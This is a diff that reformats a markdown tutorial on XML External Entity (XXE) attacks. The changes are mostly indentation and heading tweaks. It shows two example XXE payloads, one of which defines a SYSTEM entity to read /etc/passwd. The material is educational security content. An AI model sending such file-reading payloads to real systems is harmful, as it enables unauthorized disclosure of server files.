@@ -68,7 +68,8 @@ Use Of Sqlite3 :
                       select * from table_name ;  // see more //
                       
                 
-###2. XML OR XML External Entity OR XXE :
+### 2. XML OR XML External Entity OR XXE :
+
 An XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data.
 
 #### :-1:Disadvantage of XML attack :
@@ -92,17 +93,17 @@ An XML External Entity (XXE) attack is a vulnerability that abuses features of X
 
 ##### :pray:Note : For better understanding you need to learn basic of XML language 
 
-### XXE Payload :
+### 👀 XXE Payload :
 
 Now we'll see some XXE payload and see how they are working.
 
 1) The first payload we'll see is very simple. If you've read the previous task properly then you'll understand this payload very easily.
 
-<!DOCTYPE replace [<!ENTITY name "feast"> ]>
- <userInfo>
-  <firstName>falcon</firstName>
-  <lastName>&name;</lastName>
- </userInfo>
+         <!DOCTYPE replace [<!ENTITY name "feast"> ]>
+         <userInfo>
+           <firstName>falcon</firstName>
+           <lastName>&name;</lastName>
+         </userInfo>
 
 
 
@@ -110,9 +111,9 @@ As we can see we are defining a ENTITY called name and assigning it a value feas
 
 2) We can also use XXE to read some file from the system by defining an ENTITY and having it use the SYSTEM keyword
 
-<?xml version="1.0"?>
-<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
-<root>&read;</root>
+         <?xml version="1.0"?>
+         <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+         <root>&read;</root>
 
 Here again, we are defining an ENTITY with the name read but the difference is that we are setting it value to `SYSTEM` and path of the file.
 
